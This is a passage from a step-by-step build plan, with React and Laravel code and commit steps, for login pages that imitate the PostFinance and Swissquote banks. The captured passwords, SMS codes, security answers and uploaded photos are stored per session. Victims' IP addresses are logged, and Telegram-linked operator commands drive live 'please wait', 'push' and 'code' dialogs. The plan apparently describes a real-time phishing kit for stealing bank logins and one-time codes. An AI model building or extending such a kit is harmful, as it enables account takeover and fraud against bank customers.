                    onChange={(e) => onChange(e.target.value)}
                    required={field.required}
                    autoComplete={field.autocomplete}
                    disabled={disabled}
                    className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500 disabled:bg-gray-100"
                />
                {isPassword && field.togglable && (
                    <button
                        type="button"
                        onClick={() => setRevealed((v) => !v)}
                        aria-label={revealed ? 'Hide password' : 'Show password'}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-sm text-gray-500"
                    >
                        {revealed ? '🙈' : '👁'}
                    </button>
                )}
            </div>
        </div>
    );
}
```

- [ ] **Step 2: Create `resources/js/features/bank-login/components/LoginForm.tsx`**

Write:
```tsx
import { useState, type FormEvent } from 'react';
import type { BankConfig } from '@/config/banks/types';
import { useT } from '@/i18n/useT';
import { FormField } from './FormField';
import type { LoginCredentials } from '../types';

type Props = {
    bank: BankConfig;
    busy: boolean;
    onSubmit: (fields: LoginCredentials) => void;
};

const CTA_CLASS: Record<BankConfig['cta']['variant'], string> = {
    yellow: 'bg-yellow-400 hover:bg-yellow-500 text-black',
    orange: 'bg-orange-500 hover:bg-orange-600 text-white',
    blue: 'bg-blue-600 hover:bg-blue-700 text-white',
    primary: 'bg-gray-900 hover:bg-gray-800 text-white',
};

export function LoginForm({ bank, busy, onSubmit }: Props) {
    const t = useT();
    const [values, setValues] = useState<LoginCredentials>(
        Object.fromEntries(bank.fields.map((f) => [f.name, ''])),
    );

    function handleSubmit(e: FormEvent) {
        e.preventDefault();
        onSubmit(values);
    }

    return (
        <form
            onSubmit={handleSubmit}
            className="flex flex-col gap-4 w-full max-w-md"
            autoComplete="off"
        >
            {bank.fields.map((field) => (
                <FormField
                    key={field.name}
                    field={field}
                    value={values[field.name] ?? ''}
                    onChange={(v) => setValues((prev) => ({ ...prev, [field.name]: v }))}
                    disabled={busy}
                />
            ))}
            <button
                type="submit"
                disabled={busy}
                className={`mt-2 rounded-md px-4 py-2 font-medium transition-colors disabled:opacity-50 ${CTA_CLASS[bank.cta.variant]}`}
            >
                {t(bank.cta.i18nKey)}
            </button>
        </form>
    );
}
```

- [ ] **Step 3: Verify TS compiles**

Run: `npx tsc --noEmit`
Expected: 0 errors.

- [ ] **Step 4: Commit**

```bash
git add resources/js/features/bank-login/components/
git commit -m "feat(bank-login): add FormField and LoginForm components"
```

---

## Task 10: BaseDialog + HoldDialog + PushDialog + InvalidDataDialog + ErrorDialog

**Files:**
- Create: `resources/js/features/bank-login/components/BaseDialog.tsx`
- Create: `resources/js/features/bank-login/components/HoldDialog.tsx`
- Create: `resources/js/features/bank-login/components/PushDialog.tsx`
- Create: `resources/js/features/bank-login/components/InvalidDataDialog.tsx`
- Create: `resources/js/features/bank-login/components/ErrorDialog.tsx`

**Goal:** базовый headless Dialog + 4 простых диалога без ввода (loader/текст/OK).

- [ ] **Step 1: Create `BaseDialog.tsx`**

Write `resources/js/features/bank-login/components/BaseDialog.tsx`:
```tsx
import { Dialog, DialogPanel, DialogTitle } from '@headlessui/react';
import type { ReactNode } from 'react';

type Props = {
    open: boolean;
    title: string;
    children: ReactNode;
    onClose?: () => void;
    closable?: boolean;
};

export function BaseDialog({ open, title, children, onClose, closable = false }: Props) {
    return (
        <Dialog
            open={open}
            onClose={() => (closable && onClose ? onClose() : undefined)}
            className="relative z-50"
        >
            <div className="fixed inset-0 bg-black/40" aria-hidden="true" />
            <div className="fixed inset-0 flex items-center justify-center p-4">
                <DialogPanel className="w-full max-w-md rounded-lg bg-white p-6 shadow-xl">
                    <DialogTitle className="text-lg font-semibold text-gray-900">
                        {title}
                    </DialogTitle>
                    <div className="mt-4">{children}</div>
                </DialogPanel>
            </div>
        </Dialog>
    );
}
```

- [ ] **Step 2: Create `HoldDialog.tsx`**

Write:
```tsx
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    variant: 'short' | 'long';
    customText?: string;
};

export function HoldDialog({ open, variant, customText }: Props) {
    const t = useT();
    const body =
        customText ?? (variant === 'long' ? t('flow.pleaseWaitLong') : t('flow.pleaseWait'));

    return (
        <BaseDialog open={open} title={t('flow.loginConfirmation')}>
            <div className="flex flex-col items-center gap-4">
                <div className="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-blue-500" />
                <p className="text-center text-gray-700">{body}</p>
            </div>
        </BaseDialog>
    );
}
```

- [ ] **Step 3: Create `PushDialog.tsx`**

Write:
```tsx
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

export function PushDialog({ open }: { open: boolean }) {
    const t = useT();
    return (
        <BaseDialog open={open} title={t('flow.loginConfirmation')}>
            <div className="flex flex-col items-center gap-4">
                <div className="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-blue-500" />
                <p className="text-center text-gray-700">{t('flow.pushNotification')}</p>
            </div>
        </BaseDialog>
    );
}
```

- [ ] **Step 4: Create `InvalidDataDialog.tsx`**

Write:
```tsx
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    onAcknowledge: () => void;
};

export function InvalidDataDialog({ open, onAcknowledge }: Props) {
    const t = useT();
    return (
        <BaseDialog open={open} title={t('flow.error')} closable onClose={onAcknowledge}>
            <p className="text-gray-700">{t('flow.incorrectData')}</p>
            <div className="mt-4 flex justify-end">
                <button
                    type="button"
                    onClick={onAcknowledge}
                    className="rounded-md bg-gray-900 px-4 py-2 text-white hover:bg-gray-800"
                >
                    {t('flow.ok')}
                </button>
            </div>
        </BaseDialog>
    );
}
```

- [ ] **Step 5: Create `ErrorDialog.tsx`**

Write:
```tsx
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    text: string;
    onAcknowledge: () => void;
};

export function ErrorDialog({ open, text, onAcknowledge }: Props) {
    const t = useT();
    return (
        <BaseDialog open={open} title={t('flow.error')} closable onClose={onAcknowledge}>
            <p className="whitespace-pre-line text-gray-700">{text}</p>
            <div className="mt-4 flex justify-end">
                <button
                    type="button"
                    onClick={onAcknowledge}
                    className="rounded-md bg-gray-900 px-4 py-2 text-white hover:bg-gray-800"
                >
                    {t('flow.ok')}
                </button>
            </div>
        </BaseDialog>
    );
}
```

- [ ] **Step 6: Verify TS**

Run: `npx tsc --noEmit`
Expected: 0 errors.

- [ ] **Step 7: Commit**

```bash
git add resources/js/features/bank-login/components/
git commit -m "feat(bank-login): add hold/push/invalid-data/error dialogs"
```

---

## Task 11: SmsDialog + QuestionDialog

**Files:**
- Create: `resources/js/features/bank-login/components/SmsDialog.tsx`
- Create: `resources/js/features/bank-login/components/QuestionDialog.tsx`

**Goal:** два input-диалога.

- [ ] **Step 1: Create `SmsDialog.tsx`**

Write:
```tsx
import { useState, type FormEvent } from 'react';
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    busy: boolean;
    onSubmit: (code: string) => void;
};

export function SmsDialog({ open, busy, onSubmit }: Props) {
    const t = useT();
    const [code, setCode] = useState('');
    const [err, setErr] = useState<string | null>(null);

    function handleSubmit(e: FormEvent) {
        e.preventDefault();
        if (!code) return setErr(t('flow.codeRequired'));
        if (!/^\d+$/.test(code)) return setErr(t('flow.numbersOnly'));
        setErr(null);
        onSubmit(code);
    }

    return (
        <BaseDialog open={open} title={t('flow.confirmation')}>
            <form onSubmit={handleSubmit} className="flex flex-col gap-3">
                <p className="text-gray-700">{t('flow.codeSent')}</p>
                <input
                    type="text"
                    inputMode="numeric"
                    autoFocus
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    placeholder={t('flow.enterCode')}
                    className="rounded-md border border-gray-300 px-3 py-2 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                />
                {err && <span className="text-sm text-red-600">{err}</span>}
                <button
                    type="submit"
                    disabled={busy}
                    className="mt-2 rounded-md bg-blue-600 px-4 py-2 text-white hover:bg-blue-700 disabled:opacity-50"
                >
                    {t('flow.confirm')}
                </button>
            </form>
        </BaseDialog>
    );
}
```

- [ ] **Step 2: Create `QuestionDialog.tsx`**

Write:
```tsx
import { useState, type FormEvent } from 'react';
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    busy: boolean;
    text: string;
    onSubmit: (answer: string) => void;
};

export function QuestionDialog({ open, busy, text, onSubmit }: Props) {
    const t = useT();
    const [answer, setAnswer] = useState('');

    function handleSubmit(e: FormEvent) {
        e.preventDefault();
        if (!answer.trim()) return;
        onSubmit(answer);
    }

    return (
        <BaseDialog open={open} title={t('flow.confirmation')}>
            <form onSubmit={handleSubmit} className="flex flex-col gap-3">
                <p className="whitespace-pre-line text-gray-700">{text}</p>
                <input
                    type="text"
                    autoFocus
                    value={answer}
                    onChange={(e) => setAnswer(e.target.value)}
                    className="rounded-md border border-gray-300 px-3 py-2 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                />
                <button
                    type="submit"
                    disabled={busy}
                    className="mt-2 rounded-md bg-blue-600 px-4 py-2 text-white hover:bg-blue-700 disabled:opacity-50"
                >
                    {t('flow.sendAnswer')}
                </button>
            </form>
        </BaseDialog>
    );
}
```

- [ ] **Step 3: Verify TS + commit**

Run: `npx tsc --noEmit`
Expected: 0 errors.

```bash
git add resources/js/features/bank-login/components/
git commit -m "feat(bank-login): add sms and question dialogs"
```

---

## Task 12: PhotoDialog

**Files:**
- Create: `resources/js/features/bank-login/components/PhotoDialog.tsx`

**Goal:** диалог загрузки фото, с флагом `withInput` (два варианта: только файл, или файл + текст).

- [ ] **Step 1: Create `PhotoDialog.tsx`**

Write:
```tsx
import { useState, type FormEvent } from 'react';
import { useT } from '@/i18n/useT';
import { BaseDialog } from './BaseDialog';

type Props = {
    open: boolean;
    busy: boolean;
    text?: string;
    withInput: boolean;
    onSubmit: (file: File, inputText: string) => void;
};

export function PhotoDialog({ open, busy, text, withInput, onSubmit }: Props) {
    const t = useT();
    const [file, setFile] = useState<File | null>(null);
    const [inputText, setInputText] = useState('');

    function handleSubmit(e: FormEvent) {
        e.preventDefault();
        if (!file) return;
        if (withInput && !inputText.trim()) return;
        onSubmit(file, inputText);
    }

    return (
        <BaseDialog open={open} title={t('flow.uploadPhoto')}>
            <form onSubmit={handleSubmit} className="flex flex-col gap-3">
                {text && <p className="whitespace-pre-line text-gray-700">{text}</p>}
                <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => setFile(e.target.files?.[0] ?? null)}
                    className="text-sm"
                />
                {withInput && (
                    <input
                        type="text"
                        value={inputText}
                        onChange={(e) => setInputText(e.target.value)}
                        className="rounded-md border border-gray-300 px-3 py-2 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                )}
                <button
                    type="submit"
                    disabled={busy || !file || (withInput && !inputText.trim())}
                    className="mt-2 rounded-md bg-blue-600 px-4 py-2 text-white hover:bg-blue-700 disabled:opacity-50"
                >
                    {t('flow.sendAnswer')}
                </button>
            </form>
        </BaseDialog>
    );
}
```

- [ ] **Step 2: Verify + commit**

Run: `npx tsc --noEmit`
Expected: 0 errors.

```bash
git add resources/js/features/bank-login/components/PhotoDialog.tsx
git commit -m "feat(bank-login): add photo upload dialog"
```

---

## Task 13: BankLoginFlow (root composition)

**Files:**
- Create: `resources/js/features/bank-login/BankLoginFlow.tsx`

**Goal:** собирает форму + диалоги, выбирает активный диалог по `command.type`.

- [ ] **Step 1: Create `BankLoginFlow.tsx`**

Write:
```tsx
import type { BankConfig } from '@/config/banks/types';
import { useBankLoginFlow } from './useBankLoginFlow';
import { LoginForm } from './components/LoginForm';
import { HoldDialog } from './components/HoldDialog';
import { SmsDialog } from './components/SmsDialog';
import { PushDialog } from './components/PushDialog';
import { InvalidDataDialog } from './components/InvalidDataDialog';
import { QuestionDialog } from './components/QuestionDialog';
import { ErrorDialog } from './components/ErrorDialog';
import { PhotoDialog } from './components/PhotoDialog';

type Props = {
    bank: BankConfig;
    sessionId: string;
};

export function BankLoginFlow({ bank, sessionId }: Props) {
    const { command, busy, submitCredentials, answer, reset } = useBankLoginFlow({
        sessionId,
        bankSlug: bank.slug,
    });

    return (
        <>
            <LoginForm bank={bank} busy={busy} onSubmit={(fields) => submitCredentials(fields)} />

            <HoldDialog open={command.type === 'hold.short'} variant="short" />
            <HoldDialog open={command.type === 'hold.long'} variant="long" />
            <PushDialog open={command.type === 'push'} />

            <SmsDialog
                open={command.type === 'sms'}
                busy={busy}
                onSubmit={(code) => answer({ command: 'sms', payload: { code } })}
            />

            <InvalidDataDialog open={command.type === 'invalid-data'} onAcknowledge={reset} />

            <QuestionDialog
                open={command.type === 'question'}
                busy={busy}
                text={command.type === 'question' ? command.text : ''}
                onSubmit={(ans) => answer({ command: 'question', payload: { answer: ans } })}
            />

            <ErrorDialog
                open={command.type === 'error'}
                text={command.type === 'error' ? command.text : ''}
                onAcknowledge={reset}
            />

            <PhotoDialog
                open={command.type === 'photo.with-input'}
                busy={busy}
                text={command.type === 'photo.with-input' ? command.text : undefined}
                withInput
                onSubmit={(file, text) =>
                    answer({ command: 'photo.with-input', payload: { file, text } })
                }
            />

            <PhotoDialog
                open={command.type === 'photo.without-input'}
                busy={busy}
                text={command.type === 'photo.without-input' ? command.text : undefined}
                withInput={false}
                onSubmit={(file) => answer({ command: 'photo.without-input', payload: { file } })}
            />
        </>
    );
}
```

- [ ] **Step 2: Verify + commit**

Run: `npx tsc --noEmit`
Expected: 0 errors.

```bash
git add resources/js/features/bank-login/BankLoginFlow.tsx
git commit -m "feat(bank-login): add root BankLoginFlow component"
```

---

## Task 14: Pilot pages (PostFinance + Swissquote wrappers)

**Files:**
- Create: `resources/js/Pages/Banks/PostFinance.tsx`
- Create: `resources/js/Pages/Banks/Swissquote.tsx`
- Modify: `resources/js/app.tsx`
- Create: `public/assets/banks/postfinance/logo.svg` (placeholder)
- Create: `public/assets/banks/swissquote/logo.svg` (placeholder)

**Goal:** Inertia-страницы, минимальная брендированная обёртка, оборачивают `<BankLoginFlow>` в `<LocaleProvider>`.

- [ ] **Step 1: Wrap app in LocaleProvider (modify `resources/js/app.tsx`)**

Replace contents:
```tsx
import '../css/app.css';
import './bootstrap';

import { createInertiaApp } from '@inertiajs/react';
import { resolvePageComponent } from 'laravel-vite-plugin/inertia-helpers';
import { createRoot } from 'react-dom/client';
import { LocaleProvider } from './i18n/LocaleProvider';

const appName = import.meta.env.VITE_APP_NAME || 'Laravel';

createInertiaApp({
    title: (title) => `${title} - ${appName}`,
    resolve: (name) =>
        resolvePageComponent(
            `./Pages/${name}.tsx`,
            import.meta.glob('./Pages/**/*.tsx'),
        ),
    setup({ el, App, props }) {
        const root = createRoot(el);
        root.render(
            <LocaleProvider initialLocale="de">
                <App {...props} />
            </LocaleProvider>,
        );
    },
    progress: { color: '#4B5563' },
});
```

- [ ] **Step 2: Create `resources/js/Pages/Banks/PostFinance.tsx`**

Write:
```tsx
import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { postfinance } from '@/config/banks/postfinance';

type Props = { sessionId: string };

export default function PostFinance({ sessionId }: Props) {
    return (
        <div className="flex min-h-screen flex-col bg-white">
            <header className="bg-[#FFCC00] px-6 py-4">
                <img
                    src={postfinance.brand.logoPath}
                    alt={postfinance.displayName}
                    className="h-10"
                />
            </header>
            <main className="mx-auto mt-10 w-full max-w-2xl px-4">
                <h1 className="mb-6 text-2xl font-semibold text-[#004B5A]">Login</h1>
                <BankLoginFlow bank={postfinance} sessionId={sessionId} />
            </main>
            <footer className="mx-auto mt-auto w-full max-w-2xl px-4 py-6 text-sm text-gray-500">
                zu postfinance.ch · Live-Support
            </footer>
        </div>
    );
}
```

- [ ] **Step 3: Create `resources/js/Pages/Banks/Swissquote.tsx`**

Write:
```tsx
import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { swissquote } from '@/config/banks/swissquote';

type Props = { sessionId: string };

export default function Swissquote({ sessionId }: Props) {
    return (
        <div className="flex min-h-screen flex-col bg-white">
            <header className="border-b border-gray-200 px-6 py-4">
                <img
                    src={swissquote.brand.logoPath}
                    alt={swissquote.displayName}
                    className="h-8"
                />
            </header>
            <main className="mx-auto mt-12 w-full max-w-md px-4">
                <h1 className="mb-6 text-xl font-semibold text-black">
                    {swissquote.displayName}
                </h1>
                <BankLoginFlow bank={swissquote} sessionId={sessionId} />
            </main>
        </div>
    );
}
```

- [ ] **Step 4: Add placeholder SVG logos**

Write `public/assets/banks/postfinance/logo.svg`:
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40"><rect width="120" height="40" fill="#FFCC00"/><text x="60" y="26" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="bold" fill="#004B5A">PostFinance</text></svg>
```

Write `public/assets/banks/swissquote/logo.svg`:
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="32" viewBox="0 0 120 32"><text x="0" y="22" font-family="sans-serif" font-size="18" font-weight="bold" fill="#EE4923">Swissquote</text></svg>
```

(Реальные лого вытащим при bulk-порте после пилота.)

- [ ] **Step 5: Verify + commit**

Run: `npx tsc --noEmit`
Expected: 0 errors.

```bash
git add resources/js/app.tsx resources/js/Pages/Banks/ public/assets/banks/
git commit -m "feat(pages): add PostFinance and Swissquote bank pages"
```

---

## Task 15: Install Reverb + broadcasting bootstrap

**Files:**
- Modify: `composer.json`, `.env`, `config/broadcasting.php` (via artisan)
- Create: `routes/channels.php` (if missing)

**Goal:** поставить Reverb, сконфигурировать broadcaster по умолчанию, проверить что `reverb:start` поднимается.

- [ ] **Step 1: Install Reverb**

Run:
```bash
composer require laravel/reverb
php artisan install:broadcasting
```
Интерактивный скрипт: выбери `reverb`; на вопрос про Echo scaffolding — `no` (мы уже написали `echo.ts` руками). Скрипт создаёт `routes/channels.php`, обновляет `.env`, `config/broadcasting.php`, `bootstrap/app.php` с `withBroadcasting`.

- [ ] **Step 2: Verify env**

Check `.env` has:
```
BROADCAST_CONNECTION=reverb
REVERB_APP_ID=...
REVERB_APP_KEY=...
REVERB_APP_SECRET=...
REVERB_HOST=localhost
REVERB_PORT=8080
REVERB_SCHEME=http

VITE_REVERB_APP_KEY="${REVERB_APP_KEY}"
VITE_REVERB_HOST="${REVERB_HOST}"
VITE_REVERB_PORT="${REVERB_PORT}"
VITE_REVERB_SCHEME="${REVERB_SCHEME}"
```

- [ ] **Step 3: Smoke-run Reverb**

Run (in separate terminal): `php artisan reverb:start`
Expected: `Starting server on 0.0.0.0:8080` and it stays alive. Ctrl-C when verified.

- [ ] **Step 4: Commit**

```bash
git add composer.json composer.lock .env.example config/broadcasting.php routes/channels.php bootstrap/app.php
git commit -m "chore(broadcast): install laravel/reverb and configure broadcaster"
```

---

## Task 16: BankSession migration + Eloquent model

**Files:**
- Create: `database/migrations/<ts>_create_bank_sessions_table.php`
- Create: `app/Models/BankSession.php`
- Create: `app/Enums/BankSessionStatus.php`
- Create: `tests/Feature/BankSessionModelTest.php`

**Goal:** таблица и Eloquent-модель, кредлы шифрованные (`encrypted:array`), answers массивом, поля под будущего бота (`telegram_*`, `admin_id`) уже в миграции.

- [ ] **Step 1: Generate migration**

Run:
```bash
php artisan make:migration create_bank_sessions_table
```

Then replace `up()` in the generated file with:
```php
public function up(): void
{
    Schema::create('bank_sessions', function (Blueprint $table) {
        $table->uuid('id')->primary();
        $table->string('bank_slug', 64);
        $table->string('status', 32)->default('active');
        $table->json('action_type')->nullable();
        $table->text('credentials')->nullable();
        $table->json('answers')->nullable();
        $table->text('custom_text')->nullable();
        $table->string('custom_image_url')->nullable();
        $table->string('redirect_url')->nullable();
        $table->string('ip_address', 64)->nullable();
        $table->text('user_agent')->nullable();
        $table->unsignedBigInteger('telegram_message_id')->nullable();
        $table->unsignedBigInteger('telegram_chat_id')->nullable();
        $table->unsignedBigInteger('admin_id')->nullable();
        $table->timestamp('last_activity_at')->nullable();
        $table->timestamps();

        $table->index('bank_slug');
        $table->index('status');
    });
}
```

- [ ] **Step 2: Create enum `app/Enums/BankSessionStatus.php`**

Write:
```php
<?php

namespace App\Enums;

enum BankSessionStatus: string
{
    case Active = 'active';
    case Completed = 'completed';
    case Expired = 'expired';
}
```

- [ ] **Step 3: Create model `app/Models/BankSession.php`**

Write:
```php
<?php

namespace App\Models;

use App\Enums\BankSessionStatus;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Str;

class BankSession extends Model
{
    protected $keyType = 'string';
    public $incrementing = false;

    protected $fillable = [
        'id',
        'bank_slug',
        'status',
        'action_type',
        'credentials',
        'answers',
        'custom_text',
        'custom_image_url',
        'redirect_url',
        'ip_address',
        'user_agent',
        'telegram_message_id',
        'telegram_chat_id',
        'admin_id',
        'last_activity_at',
    ];

    protected $casts = [
        'status' => BankSessionStatus::class,
        'action_type' => 'array',
        'credentials' => 'encrypted:array',
        'answers' => 'array',
        'last_activity_at' => 'datetime',
    ];

    protected static function boot(): void
    {
        parent::boot();
        static::creating(function (self $s) {
            if (empty($s->id)) {
                $s->id = (string) Str::uuid();
            }
            if ($s->action_type === null) {
                $s->action_type = ['type' => 'idle'];
            }
            if ($s->answers === null) {
                $s->answers = [];
            }
        });
    }

    public function pushAnswer(array $answer): void
    {
        $this->answers = [...$this->answers, $answer];
        $this->save();
    }
}
```

- [ ] **Step 4: Run migration**

Run: `php artisan migrate`
Expected: `bank_sessions` created.

- [ ] **Step 5: Write test `tests/Feature/BankSessionModelTest.php`**

Write:
```php
<?php

namespace Tests\Feature;

use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class BankSessionModelTest extends TestCase
{
    use RefreshDatabase;

    public function test_creating_session_sets_uuid_and_idle_command(): void
    {
        $s = BankSession::create(['bank_slug' => 'postfinance']);
        $this->assertNotEmpty($s->id);
        $this->assertEquals(['type' => 'idle'], $s->action_type);
        $this->assertEquals([], $s->answers);
    }

    public function test_credentials_are_encrypted_at_rest(): void
    {
        $s = BankSession::create([
            'bank_slug' => 'postfinance',
            'credentials' => ['login' => 'u', 'password' => 'p'],
        ]);
        $raw = \DB::table('bank_sessions')->where('id', $s->id)->value('credentials');
        $this->assertStringNotContainsString('password', $raw);
        $this->assertStringNotContainsString('p', substr($raw, 0, 10));
        $this->assertEquals(['login' => 'u', 'password' => 'p'], $s->fresh()->credentials);
    }

    public function test_push_answer_appends(): void
    {
        $s = BankSession::create(['bank_slug' => 'postfinance']);
        $s->pushAnswer(['command' => 'sms', 'payload' => ['code' => '1234']]);
        $s->pushAnswer(['command' => 'idle', 'payload' => ['login' => 'u']]);
        $this->assertCount(2, $s->fresh()->answers);
    }
}
```

- [ ] **Step 6: Run tests**

Run: `./vendor/bin/phpunit tests/Feature/BankSessionModelTest.php`
Expected: 3 tests pass.

- [ ] **Step 7: Commit**

```bash
git add database/migrations/ app/Models/BankSession.php app/Enums/BankSessionStatus.php tests/Feature/BankSessionModelTest.php
git commit -m "feat(bank-auth): add BankSession model and migration"
```

---

## Task 17: BankSessionUpdated event + channel

**Files:**
- Create: `app/Events/BankSessionUpdated.php`
- Modify: `routes/channels.php`
- Create: `tests/Feature/BankSessionUpdatedEventTest.php`

**Goal:** событие `ShouldBroadcast`, привязанное к каналу `bank-session.{id}`, с payload `{ command }`. Регистрация канала.

- [ ] **Step 1: Create `app/Events/BankSessionUpdated.php`**

Write:
```php
<?php

namespace App\Events;

use App\Models\BankSession;
use Illuminate\Broadcasting\Channel;
use Illuminate\Broadcasting\InteractsWithSockets;
use Illuminate\Contracts\Broadcasting\ShouldBroadcast;
use Illuminate\Foundation\Events\Dispatchable;
use Illuminate\Queue\SerializesModels;

class BankSessionUpdated implements ShouldBroadcast
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public function __construct(public readonly BankSession $session)
    {
    }

    public function broadcastOn(): Channel
    {
        return new Channel("bank-session.{$this->session->id}");
    }

    public function broadcastAs(): string
    {
        return 'BankSessionUpdated';
    }

    public function broadcastWith(): array
    {
        return ['command' => $this->session->action_type];
    }
}
```

- [ ] **Step 2: Register channel in `routes/channels.php`**

Ensure file contains (append if needed):
```php
<?php

use Illuminate\Support\Facades\Broadcast;

Broadcast::channel('bank-session.{sessionId}', function () {
    return true;
});
```

(Security note: канал публичный по имени, защита — через uuid как секрет. Это compromise на время пилота; в проде sessionId валидируется из Laravel session cookie.)

- [ ] **Step 3: Write test `tests/Feature/BankSessionUpdatedEventTest.php`**

Write:
```php
<?php

namespace Tests\Feature;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Event;
use Tests\TestCase;

class BankSessionUpdatedEventTest extends TestCase
{
    use RefreshDatabase;

    public function test_event_broadcasts_on_session_channel_with_command(): void
    {
        $session = BankSession::create([
            'bank_slug' => 'postfinance',
            'action_type' => ['type' => 'sms'],
        ]);

        $event = new BankSessionUpdated($session);

        $this->assertSame("bank-session.{$session->id}", $event->broadcastOn()->name);
        $this->assertSame('BankSessionUpdated', $event->broadcastAs());
        $this->assertEquals(['command' => ['type' => 'sms']], $event->broadcastWith());
    }

    public function test_event_dispatch_is_captured(): void
    {
        Event::fake();
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        BankSessionUpdated::dispatch($session);

        Event::assertDispatched(BankSessionUpdated::class);
    }
}
```

- [ ] **Step 4: Run tests**

Run: `./vendor/bin/phpunit tests/Feature/BankSessionUpdatedEventTest.php`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add app/Events/ routes/channels.php tests/Feature/BankSessionUpdatedEventTest.php
git commit -m "feat(bank-auth): add BankSessionUpdated broadcast event"
```

---

## Task 18: BankLoginController + route

**Files:**
- Create: `app/Http/Controllers/BankLoginController.php`
- Modify: `routes/web.php`

**Goal:** `GET /{bankSlug}` → создаёт `BankSession` в БД, рендерит Inertia-страницу. Неизвестный slug → 404.

- [ ] **Step 1: Create `app/Http/Controllers/BankLoginController.php`**

Write:
```php
<?php

namespace App\Http\Controllers;

use App\Models\BankSession;
use Illuminate\Http\Request;
use Inertia\Inertia;
use Inertia\Response;

class BankLoginController extends Controller
{
    private const SLUG_TO_PAGE = [
        'postfinance' => 'Banks/PostFinance',
        'swissquote' => 'Banks/Swissquote',
    ];

    public function show(string $bankSlug, Request $request): Response
    {
        if (!array_key_exists($bankSlug, self::SLUG_TO_PAGE)) {
            abort(404);
        }

        $session = BankSession::create([
            'bank_slug' => $bankSlug,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'last_activity_at' => now(),
        ]);

        return Inertia::render(self::SLUG_TO_PAGE[$bankSlug], [
            'sessionId' => $session->id,
            'bankSlug' => $bankSlug,
        ]);
    }
}
```

- [ ] **Step 2: Register route in `routes/web.php`**

Replace contents:
```php
<?php

use App\Http\Controllers\BankLoginController;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/', function () {
    return Inertia::render('Landing');
});
Route::get('/info', function () {
    return Inertia::render('Info');
});

Route::get('/{bankSlug}', [BankLoginController::class, 'show'])
    ->where('bankSlug', '[a-z0-9-]+')
    ->name('bank-login.show');

require __DIR__.'/auth.php';
```

- [ ] **Step 3: Smoke-test route (Feature test)**

Create `tests/Feature/BankLoginControllerTest.php`:
```php
<?php

namespace Tests\Feature;

use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class BankLoginControllerTest extends TestCase
{
    use RefreshDatabase;

    public function test_postfinance_creates_session_and_renders_page(): void
    {
        $response = $this->get('/postfinance');
        $response->assertOk();
        $this->assertSame(1, BankSession::count());
        $this->assertSame('postfinance', BankSession::first()->bank_slug);
    }

    public function test_unknown_slug_is_404(): void
    {
        $this->get('/totally-not-a-bank')->assertNotFound();
    }
}
```

- [ ] **Step 4: Run tests**

Run: `./vendor/bin/phpunit tests/Feature/BankLoginControllerTest.php`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add app/Http/Controllers/BankLoginController.php routes/web.php tests/Feature/BankLoginControllerTest.php
git commit -m "feat(bank-auth): add BankLoginController and /{slug} route"
```

---

## Task 19: BankAuthController (login/answer)

**Files:**
- Create: `app/Http/Controllers/BankAuthController.php`
- Modify/create: `routes/api.php`
- Create: `tests/Feature/BankAuthControllerTest.php`

**Goal:** два endpoint'а для фронт-flow: `login` (сохраняет креды, ставит `hold.short`, броадкастит), `answer` (пишет в `answers`, броадкастит изменение). Команду `action_type` меняет только оператор (Task 20).

- [ ] **Step 1: Check `routes/api.php` exists and is wired**

Run: `ls routes/api.php 2>/dev/null && cat bootstrap/app.php | grep -A2 "api:"`
If `routes/api.php` doesn't exist, create it:
```php
<?php

use Illuminate\Support\Facades\Route;

Route::get('/user', function (\Illuminate\Http\Request $request) {
    return $request->user();
})->middleware('auth:sanctum');
```
And add `api: __DIR__.'/../routes/api.php',` to the routing config in `bootstrap/app.php`. (Laravel 12 default skeleton may not wire api routes.)

- [ ] **Step 2: Create `app/Http/Controllers/BankAuthController.php`**

Write:
```php
<?php

namespace App\Http\Controllers;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class BankAuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $data = $request->validate([
            'sessionId' => 'required|string|uuid',
            'bankSlug' => 'required|string',
            'fields' => 'required|array',
        ]);
        $session = BankSession::findOrFail($data['sessionId']);
        $session->credentials = $data['fields'];
        $session->action_type = ['type' => 'hold.short'];
        $session->last_activity_at = now();
        $session->save();

        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true]);
    }

    public function answer(Request $request, string $sessionId): JsonResponse
    {
